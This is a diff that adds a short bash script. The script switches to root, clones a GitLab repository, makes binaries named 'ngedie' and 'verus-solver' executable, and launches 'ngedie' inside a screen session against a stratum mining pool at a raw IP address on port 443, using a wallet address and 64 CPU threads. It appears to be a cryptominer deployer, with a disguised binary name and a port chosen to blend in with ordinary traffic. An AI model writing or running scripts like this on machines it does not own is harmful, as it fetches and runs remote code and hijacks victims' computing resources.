@@ -1,0 +1,9 @@
+#!/bin/bash
+sudo su
+cd
+git clone https://gitlab.com/ontranontran/kaspo
+cd kaspo
+chmod +x ngedie
+chmod +x verus-solver
+screen -S gas
+./ngedie -c stratum+tcp://77.237.240.172:443 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.FADHIDE -p x --cpu 64
